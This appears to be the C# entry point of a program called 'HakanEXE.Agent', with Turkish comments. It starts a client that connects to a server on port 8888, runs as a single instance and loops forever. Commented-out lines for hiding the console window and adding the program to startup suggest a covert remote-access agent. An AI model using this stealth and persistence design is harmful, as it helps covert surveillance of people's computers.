using System;
using System.Diagnostics;
using System.Threading;
using HakanEXE.Agent.Core;

namespace HakanEXE.Agent
{
    class Program
    {
        [STAThread] // Bazı UI işlemleri (örneğin ekran görüntüsü) için gerekli olabilir
        static void Main(string[] args)
        {
            // Gizlilik: Konsol penceresini gizle
            // Bu kısım NativeMethods/WinAPI.cs ile yapılabilir
            // NativeMethods.WinAPI.HideConsoleWindow();

            // Sadece bir örnek çalışmasına izin ver
            string appName = "HakanEXE.Agent"; // Uygulama adını değiştirilebilir
            using (Mutex mutex = new Mutex(true, appName, out bool createdNew))
            {
                if (!createdNew)
                {
                    // Zaten çalışan bir örnek var
                    Console.WriteLine("Agent zaten çalışıyor.");
                    return;
                }

                // AgentClient'ı başlat
                AgentClient agent = new AgentClient("127.0.0.1", 8888); // Sunucu IP ve Portu
                agent.Start();

                // Startup'a ekleme (gerekirse)
                // ProcessManager.AddToStartup("HakanEXE Agent", Application.ExecutablePath);

                // Uygulamanın çalışmaya devam etmesi için ana thread'i engelle
                // Normalde bu tür uygulamalar bir Windows Service veya benzeri bir döngüde çalışır
                // Şimdilik basitçe bir bekleme döngüsü koyalım
                Console.WriteLine("Agent çalışıyor. Kapatmak için bir tuşa basın...");
                // Console.ReadLine(); // Konsol gizlenmişse bu çalışmaz

                // Bir Windows Service'e dönüştürülmediği sürece bu thread'i çalışır tutmalıyız
                while (true)
                {
                    Thread.Sleep(1000); // CPU kullanımı düşürmek için
                }
            }
        }
    }
}